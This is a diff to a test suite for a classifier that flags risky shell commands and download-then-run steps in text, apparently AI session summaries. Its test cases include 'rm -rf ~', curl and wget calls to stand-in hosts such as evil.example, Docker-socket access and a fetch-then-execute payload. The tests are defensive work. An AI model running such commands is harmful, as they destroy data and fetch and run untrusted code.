@@ -1737,6 +1737,13 @@ describe("fix pass 4: the verb is read by the classifier's parser, and addresses
 			"sudo -u root make y",
 			"ssh deploy@host.test uptime",
 			"bash -c 'rm -rf ~'",
+			// opaque with a verb that is not risky by name: the text cannot say what runs
+			"docker build -t x:$TAG .",
+			"kubectl apply -f $FILE",
+			"git commit -m $MSG",
+			"make test$SUFFIX",
+			"docker build -t x:{a,b} .",
+			'docker build -t "unterminated .',
 		]) {
 			risky(c);
 		}
@@ -1774,6 +1781,10 @@ describe("fix pass 4: the verb is read by the classifier's parser, and addresses
 		expect(codes("$ foo https://evil.example/x")).toContain("risky_command");
 		expect(codes("```sh\nfoo https://evil.example/x\n```")).toContain("risky_command");
 		expect(codes("$ foo https://evil.io\\@example.com/x")).toContain("risky_command");
+		// userinfo on a typed address is malformed but not unexpected: still risky
+		expect(
+			codes("$ foo https://user@typed.test/x", { urls: typed("see https://typed.test/x") }),
+		).toContain("risky_command");
 		// a fence labelled with a data language is not a command block
 		expect(codes('```json\n{"u": "https://evil.example/x"}\n```')).not.toContain("risky_command");
 		// typed addresses and loopback reads are the existing exemptions
@@ -1829,6 +1840,13 @@ describe("fix pass 4: the verb is read by the classifier's parser, and addresses
 			"wget -i list.txt http://localhost:3000/x",
 			"wget -P /tmp http://localhost:3000/x",
 			"wget --directory-prefix=/x http://localhost:3000/x",
+			"wget -Pout http://localhost:3000/x",
+			"wget -ifil http://localhost:3000/x",
+			"curl --config=cfg http://localhost:3000/",
+			"curl --unix-socket=/var/run/docker.sock http://localhost/x",
+			"curl --header 'X-HTTP-Method-Override: DELETE' http://localhost:3000/x",
+			"curl --header=X-HTTP-Method-Override:DELETE http://localhost:3000/x",
+			"curl -sH 'X-HTTP-Method-Override: DELETE' http://localhost:3000/x",
 			"curl http://localhost:3000/ evil.cyou/p",
 			"curl http://localhost:3000/ somewhere",
 			"iwr http://localhost:3000/health",
@@ -1866,6 +1884,15 @@ describe("fix pass 4: the verb is read by the classifier's parser, and addresses
 		const base = summaryOf();
 		const found = (sm: SessionSummary) => runTripwire(sm, contextOf(NO_URLS));
 		const fetch = "Download it with curl https://evil.example/x -o x";
+		// the run step is the very first character of both copy payloads
+		expect(
+			found({
+				...base,
+				overview: "./x",
+				outcome: { status: "completed", explanation: "./x" },
+				handoff: fetch,
+			}),
+		).toContain("pipe_to_shell");
 		expect(
 			found({ ...base, outcome: { status: "completed", explanation: "./x" }, handoff: fetch }),
 		).toContain("pipe_to_shell");
